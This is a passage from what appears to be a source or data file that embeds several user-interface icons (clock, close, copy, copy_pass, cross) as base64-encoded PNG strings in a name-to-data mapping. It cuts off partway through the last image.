'iVBORw0KGgoAAAANSUhEUgAAACAAAAAgEAQAAACJ4248AAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAAACYktHRAAAqo0jMgAAAAlwSFlzAAAAYAAAAGAA8GtCzwAAAAd0SU1FB+cIFg0gHXzNGTAAAANoSURBVFjD5ZfLaxNxEMfnlyhaNVofQU0PRi1UpIXS1oMIaZGitjYXaf8AEZH+Bd7EuxdBLP4Tio9Ib42efGHRljbaIrbWPqgeBAUp4nw8TJNtzG6yifWiAwv7mPnOzHdmd2ZF/ndxYRXBOaG9XVw6LdLVJZJICPv3G8rCgsjiokg2K2Qy4l6+dA7WJUJwDk2n4fVrwormcujAALjQCQY4P3gQnj/3kOfm4OZN6O2FpiY0FkO3bYOmJujpgRs3YHbW03/2DJLJGp2fOAFLSwa0vAyXL6ObNlW2i0TQgQH03Tuz/fwZTp6s0nlnJ6ysGMDwMNTXV52AxmJw/75hrKxAZ2d42vXTJzO8dQui0ZoozLPB9eseixXKAc55NR8e/hPnxUHcvWvN+fRp2ca0zgWYn6+F9mDcWMwaGND+/uDsNZezAAYH/YH27EE3bCjrSFta/PEvXDDsyUlfFtBjx0zh40d040Zf53z/DmNjaDxe+jweh/Fxw2htLQ0gGoWZGWOhoyN/P1LQcH19dvLggYv8+FGaw5cvItPTIi0t4kZG1gaBxuPiRkZEmptFpqZEZmZ+t3bu50+Re/fs4uxZH4oeP7bo0ulgitdmOT6OxuNF9zSXg0Qi2P70adPLZn0CmJ424CNHpIyUBFE4n5yEffvK2nLokOlOTfkAf/tm0e3YIRXEghgbK/r25wdT2QA2bwZV+Po1f29ND6xOLxdmgNQ66Zyzw8c+dAnYvRtevVr/EvDoUcUmZOdOdHTUQCYm0L17q2vCU6fKNOHVqwY8NOTvvK4OffHCdN68WZttcWO+fQu7dvlj5OfClSs+0XV0FGa+34eIo0c9B6VZFgdx/HipfTQK79/b8/Z2n+icszoCeumSfwatrbB1a3CJ6uqgrc3/2fnzhdIFDSS0v9/7HFd+HcOKbU0fPhj2uXPBijhnaxRAJgORSBV+gjH19m1j9smTinsiJJO2PIDteLUHYc6vXSssJHrgQEjKUilvJctk0O3ba6P9zp3CSqapVJUAqZTHxNwcevFiuV3AyzoatYZbHb0sL1ft3ANLJm2NysvsrJWlpwdtbIQtW+w4fBjOnLH3PP+qrdY8LO3l2eju/ls/JtX9mklbm0hfn9DVJS6REBoaDGV+XlhYEJfNijx8KDI6um6/Zv+8/AKJTxS0ae2z8AAAAABJRU5ErkJggg==', 'clock.png': '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', 'close.png': 'iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAACXBIWXMAAC4jAAAuIwF4pT92AAAAAXNSR0IArs4c6QAAAHJJREFUGFcFwbENAjEMAMB4msSLfPeKUtPQIAWnfYagocI2EhUNbfSi+0EiZ4BkDu5gjPHc9/0gop+IrDHGBVQ15Zy19/7x3p9F5ArOOWit3RHxZmYPRNyAmVciepvZN4RwUtULzDlftdajlFKZOaWUlj+NcjK1MEpfYwAAAABJRU5ErkJggg==', 'copy.png': 'iVBORw0KGgoAAAANSUhEUgAAAEAAAABAEAYAAAD6+a2dAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAAAGYktHRAAAAAAAAPlDu38AAAAJcEhZcwAAAGAAAABgAPBrQs8AAAAHdElNRQfnCAgLKS6mlJ9xAAAMNUlEQVR42u2daVRURxbH//fRNJtGBNyXuIKAjJroGY6o0aDGRAJqZMZ9YTMuUWfE7UyigsYkoGYxbnTjijoGR8GgxmgSIup4xF0xYmJcYowLCsrW0N3vzgd8YGA4LEJXo/370qdfv/fqX7fueVWv6tZtQh0nZ8zQ8HcPNG4sLZCPGy736UMuPAHenp78KzXnK5060Wz0gK+rKy/BVprWsCFtgC32OTpyMPfF0Hr1lPtQLCVjd04OT4QOb2Vl0fsYzV9mZvIHfJD+np5ObWg1D7l8ma9TruSTliavJ1+rRykp9eJ2L1v7xr17ou1QXUi0gMqSF/j2oNDpPXpgm2TPS0eOpA85Cj8MGMDT6DAae3rCHonQkOnqk4cAhDLTl9wH99LSeCqpudO338KHb3LM9u32V/b0Wh998qRou1WE2TkAy292GP3eSy/pvNT+tjfDwvh1jiCvoCB8QmNwx91dtL5KMxVW+OzSJTqBNjx6wwbbCzyMXdetI2lPr/XR2dmi5SkId4BHxwIDg5c7OVn7FTpI/54xg4bBmy+89x5/gf0Y07ChaH01BU3Hm4jLzJQ1mMT5X3yhf2TwU0/5/HNHx71716zJzBSmy9QFMgMAke6if2FIytixmIoTuLlsGX9D0fihUSNRhjA1FMJRcHz4kKfiM7KOjLTr2W1186UrVxJFUATJssl0mKog3U1/7+DlHTrIKqpHkZs2wREOCOzZ01Tlmz23MBZeR49KF+m4lDZ+vO2whGUxMVev1naxUm0XkLc4QAptN3QoR5MDtUtNtTR8ObTEFlzw8ZFT+abc9MyZ/P7+0aHnRoyo7WJr/AnAvJAXsiTp6p05+nu/5cv5PkWjw8yZtV2R55ZcrOS5K1bYuXRt1bLD7Nk13UXUmAOwHDg8cLhanZ9cMKzB3Y0b4U074DZypBirPYccwDmEb9tmF9BkgLR8wgSSYjQxGr3+WW/7zA6gNLxuSeH1Bk127+ZwtEDBW2+JttfzCi1CIFbt3Wv7cZMfpWlDhz6rI1R7DKCM5vPnFHZucFmjsTS8aeBFiMfUwYPzk+/0ky9v2qR0udW9X7Uv1NXzPxLSd8UKROIMvMeNE22YF44nXWz+ibOv3Pb75JPq3qbKXUBerv/bwUGBgSCSSPrqK9F2sFAETaKeGDRqlN2WhLna4du3V/a6Sj8BdLuGhIeFtW9PEdhENzQa0RW2UIpmcijWrFmjmzvs/MQb7dpV9rIKnwDFff0fAf1DGhw5YnmPN3NO4ip+T0mx6514Ubv/tdeKlseKWvH/UeETIO9wwOjgS8HBloavI3RHe7To3Vt3z79jcFLFY7NyHUBZpJE+ggcFffSR6HpZqCKDKQ9vREVlcgCPZ0fH8k5TlfeD9YSCGXR95kw+S9Ho7OJi+hpYW6tUgEo1aFDfvoAkeXh07AgQ2dvb2ZleDfODB5mZgNF48uT584DReOzYqVOm11FpvYfRnSY3bmx7Db1V7tOnFx2NjCx9XpkxQPF6fJg63E5z/brpl2VVKpUKsLFZunTOHECSXF3bthVnyPIwGL7++tAhQK+Pjd2xQ7Sa8lFWHW3jcF+mNm1KxyOU6QKKAzEErcerVL6+Pj7m2/AlOv38fH0BolatmjcXraZ8WEtzkOXkpLPGRau1oaGlfy87BgjkKRQyfrwowebe8CUQEdUdvTyOvuU/goNLHy92ACXmjufQLCR27ixOqo2NWi2u9KpCZGtrYyNaRSVYBSNmenjkLvMfG+zbrZtyuGQQ+CTYEnoYMVO02ppAlmUZYL5z5/59gDk/X6er+VKYs7IePxZd18pDvemiZDtqVNG3M2eKHYA+wwQMGDiQpyIWnqJlVgej0WgEDIb4+H37AINh377vvweYHz/OyRGtzXyg5cjlG/37K99VSlw9T5QzDI4eHgCAOjXRW9TwhYVLlqxcCRiNZ86kpQFKVyJJnp6urgCRo+NLL9W+GuZHj7KzAVn++edr1wCgoKCwULSNntK3GvMQ26VL9i9+fwnTuriolA0VsMfPuGDCuPoawmDYvfvAgZKGl6T27V9+GVCr586dPBkgatzY2dn0upjv33/4ECgsjIpau/ZphxDMk/0TVjOk6cbIPn0k7ogUni5y0FddmJkBg2H//uRkQJk/UKtnz540SVzDKxA1auTkVKIHUKutrUXb7Cl9nek8zfL0lOgU9iPOzU20oKqiDL6UGTpJatOmZUuAqGlTcwouVxxRktq2bd1atJoS+CK+4+VubhJNwQj6sWNH0YKqjk5XUFDyjahhwwYNRGsqHyJn5/Jn5AXoWYBe5O3qKnEcn4KXiLl+CyLhbTiA7i4uEi2CjN/q1xctyIJpocXIxe369SUOoSHwK9kmbeHFgKchD3fq16/1nUEWzBuJtJyAJMtc2YsGfQl7NM3OlngRJLQyn/3qFkwDfwAHNM/OlmgMvYoLGRmiBVkwLTQKb+BkRobEH/NapF+5IlqQBdPCs3g3QtPTJeqKPCxLTxctqFgY5+Xl54tW8fxDHnhAW9PTJT4rrSK+eFG0IAVZvnDBfNzx+YX/S5+iMC1NUtKdKVmvRAszGo8cSU0FjMajR80/x1Yd5AHH4rgsG3cbT5BvSopKyXOX38H/l5Cv09J4DiUCIlcHi1b5Cgujo9etA6yskpOPHy8KC+/QAQAcHOztASAry/LuUnVoMmnx/rlz9U8nzYsZkZFRHBHE/6I56HfwIPSA2JjAP2M0pqaeO1fyaeHZ4GnohSWHDiGp6HvJTKAn/1OO2LZNtEALtQtr4UOdStq52AGUzJYUxcsRYD6DwkpXjAsKnl4eNj/+vHxtcp4krnTYmUianWfPKofLrgXE02rWbtokUGq1YP71199+AwC93mAQreZpDAaDAZDlq1dv3BCngjbzQGoWG1v6eBkHKE5p+iSzpTjJVYM5Jyc3F9Drt2zZtavoiPh3GkCv37o1MbEkWNTUFG8N06Oz8d2yeR3KDQLNcwqYENojIgK3kMldFiwwvfRnQ5K6dHF3B6ysfHx69AAkqUkTU4S9yPK9exkZRa+xp04Bsnz2bFGUshjoJ3yK3AUL7F5NbKfdvnhxmd/LuzAra/DgyZMbNrTxt5qv75We/qKlcq3rUA+0h/Xdu/mH1Tclg5ubk3P8zhjNo0dlzqvoRrpO/mODfYOC5NP0mNqW7UMsmCd0DEs4adw4u/6JXrF3tmwp77wKA0JsftqzJfa7DRuUXLaiK2ahApIxEFMOH7b1TfSKvRMXV9HpFTqAkmNGSWJMi3gDrpV9lFgQC81FDgZnZUk/WvU2Ok+cWFFuoOLrqlpQ3pWAXiGfDx+OlnDGhfh40RW38IR4/o4j33nHfvyenNjmRe9BlaHKMYH2rolHtDN27lSSGIuu9wtPInfG4qioqja8QrWDQu1cElvHdgwPx3hexdM3bhRthxcOJXn0iG5LWjSdP7+6t6m2Ayh9jN2OphFWK8PCaBl+h82+faLt8rxD4TwS3yQlFWcNf8b08TWYLv41XsgqVb634+3bzdatQzKmsF9QkGiDPTdo+a94OS7OblrTa9LNoCCzSRdfmuLMoicCuoUOjoqCF1pzs/BwETar0ygBOgf5KlpHR9uN2POhttm8eZUd3VeWWs8HkBcawMGvDBlCjHV0af365+3fwGqc+RiNDx8/pk2URH6hoXZZCZs1qbWXlLvWdwbZaxIp9nRCAjlb9TSmd++u5LKt7XLrHE8mcKTT8l1kdu1a2w2vIP5v4yZSW/aOjlYyW5pajyiUVTpZI81F1vz59vYJCVqtRlPTj/iKMPnewOK3B689am3vzZt1qbhlULm50R08YPeFCxXDmFpXrdd7NK7jgwcPlNW5/JU2/5IetWvn4JCQoNXGxJi64Yt1iTZMaVgOHD7lq3r1dNYF/fXBYWH4mJpz56CgouxlnnUmf5kSWcUzaDrr16+3a6C2tzFoNCTF71z9N/PZi2l2DlAeSoJDJc8dreWVvHHAAI5EJ/Tz8oIzBcO7+v+dU2WehFfTLOoJnD/PQVgPHDyoxNyVDr0yV+qMA5RH9it+J8NCXVysZkh9jRF9+lALTJJe9/DgbPoPJ7i70/sYBntXV/6Uh+GWkxNtRCPscnQsnRdB2SXNE3Afw7Ky6B+0Cy0fPuQ5cGdVejq14MvS65cvKxsqlLj6+qeTusdo6u7eyv8B8uJGR2rliLMAAAAASUVORK5CYII=', 'copy2.png': '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', 'copy_pass.png': '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', 'cross.png': 'iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAAXNSR0IArs4c6QAABrNJREFUaEPVWnlsFGUU/73Zdme7W0iLoAETQzCKx+gIURy5JNyVQyCWKgpq5SigyKHgLUYxyi1Hi5SAFGJAOSVcwYNwDrYpjg5GI0qiEQu1u66E0u3U/cyrU1OgpVP2q+BLJv2j37z3fvt93zt+bwj/cyEZ/gshOgHoDkAHcCOAdgCCAFQAVQB+B1AK4BiArwAUEtEBGbYvG4AQohuAh93nOID9AIoBfK/pRtGFztmWeTeA9gA6AugK4AYAOwB8kAiYRgMQQgwBMAVAcwAFmm7Mv9xf0rZM1jMKwFkAC4loY2N1eQYghLgTwLsAmgGYq+nG5sYaq2+9bZlDATwP4A8AbxDRl151ewIghHgRwAsAZmi6kedVeWPX2ZaZA2AOgNeJaIGX9xsEIIRYBaC1phv9vCiUsca2zN188YnosYb01QtACMERZDuA7zTdmNiQItn/ty1zCYCbAAwnoj/r018nACGE33W+UNMNPj5XRGzLfBuAQUS9GgtgHYDfNN2YfEU8r2XUtsyFANoQUVZdvly0A0KImZyQNN3gcHlViG2ZHPGOEtGbFzp0HgA3Oa3TdKONDM+fm5LTae6CZZ5D4qVs2pZ5EsBIIvq89roLARwEsETTjQ8TBbBr+4bJLVu2HBEOh9f2zRi2KFF9tmU+AmASEXWuE4AQYgyAQZpuDErUGL9/5NBn7wWDwdFlZWX5PXoNlHKXbMvcBuATIlpR4+O/OyCEsAHkaLrBNU3CUly4b7Xf73/8zJkzK+/r2ic7YYUAbMvk+msFEd1yHgAhxHAAT2m60VeGIdZRaH6Rq6rq6Egksvz+ngOelqXXtsw9AHKJaAvrrN4BIcRHALZqurFWlqGD+3bPbdas2diSkpK8vhnDZsjSa1vmSABZRFR91EkIwVVlmaYbSbKMsJ6iI3tXBgKB7Gg0mt+lez++X9LEtkzOzNcSUYwBPABggqYbA6RZ4KBdtH91cnKy1DtQ459tmdxHLCeirQzgLQDlmm7Mkgng8IE981JTU8edOnVqae9+Q6QdIfbRtsyXAISI6BUGwAXbUk03+K80ccPouNLS0tyefQZPlab4HwB8WsYS0RAG8HW3HhnHI5EINxVSpEOHO7Lzly3uHwgEMiORyLpHR44+/PMvvyaczGqcS09P37x/787biag9A4houpHm1fNd2zc8GwgE2qqq2ryysrK8srLybDAYbAEg6dy5c6WKoiQFAoE2oVDoHp/P1y4Wi/1YUVFR6DjOScdxqoLBYCtu9MvLy8MpKSlBn8+X6jhOtKKi4kTfjGGLvfphW2YJEbVmAHz+U7y8OH3ahM6ZmZmLVFW9VVGUkBAiBiBGRBzJEI/Hubf1KYrCvYRgISKFo108Hq8goioiSnVDN0cSlYjUeDxeHovFjq1fv36i19rJtsxyIgo1CkAoFCzY9PGao2lpaW19Pl86O+w4TnlycvI1iqL4HMep3gFFUdqoqtpRUZS2juOccBznaDwePymEqFJVtVU8Hv/LcZywz+cLJSUlBauqqqJlZWU/ZQzM9EwQ2JbpEJGfAYQ13Uj3sgNe10yfNqFbVlbWJFVVH4pGo+tnvTN39Y4de3Z6fd/LOtsyTxPRdU1yidmBpoxC7iW+jWsiBsBJgUtoqWGU80AoFMo5ffr0kibIA+eFUU5kZzXd4P5TmhQX7ivw+/2jotHoyi7d+0mpRmtl4pcBpBDRq7wDjGa87FKi6MjeVYFA4MlIJJLfrUeG7FqITwuX1VtqirlSTTeYiZAmbikxpqSkJLdP/6FMikkT2zIrAKRVF3NuTJZeThcd2Zunqmp2OBzmfuAZWd7blslkF5fTg1lnDQCmLLJlNjTFhfvW+P3+kbLvgNvQ5BFRNTdbu6X8